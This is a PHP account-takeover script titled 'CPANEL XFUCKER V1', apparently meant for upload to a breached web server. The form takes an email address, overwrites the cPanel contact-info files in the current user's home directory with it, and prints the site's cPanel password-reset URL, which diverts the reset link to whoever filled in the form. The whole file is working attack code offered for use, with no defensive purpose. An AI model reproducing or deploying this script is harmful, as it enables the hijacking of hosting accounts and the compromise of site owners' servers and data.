<?php
echo '<html>
    <head> 
    <link rel="shortcut icon" href="https://www.scopehosts.com/storage/app/media/cpanel-hosting-white.png">
    
	      <title>cp xfucker v1 </title>
	      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<body bgcolor= #484848 >
</body>
<style>
input[type="email"] {
  border: 1px solid #ddd;
  padding: 4px 8px;
}

input[type="email"]:focus {
  border: 1px solid #000;
}

input[type="submit"] {
  font-weight: bold;
  padding: 4px 8px;
  border:1px solid #000;
  background: red;
  color:black;
}
</style>
      	</head>
     <body>
	 <!--SCC -->
       <center> 	
       <br><br><br><br><br><br><br><br><code><font size="30">CPANEL XFUCKER V1</code></font><br><br> 
	   <div style="border-radius: 2px;border: 1px solid gray;padding: 2px 2px;width: 20%;line-height: 40px;background: black;color:white;">
	   <br>
	<p>   
	    <form action="#" method="post">
	    <b> Enter YOUR maiL </b><br>
	<input type="email" name="email" style="background-color: white;font: 9pt tahoma;color:#0F32E6;" /><br><br>
	<input type="submit" name="submit" value="FIRE" style="style="border-radius: 50px;font: 10pt tahoma;color:black;"/>
	
	</form>
	<br>
	</p>
	</div>
   </center>
    </body>
</html>';

$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');

if(isset($_POST['submit'])){
	
	$email = $_POST['email'];
	$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$parm = $site.':2083/resetpass?start=1';
echo '<br/><center>'.$parm.'</center>';
}

?>
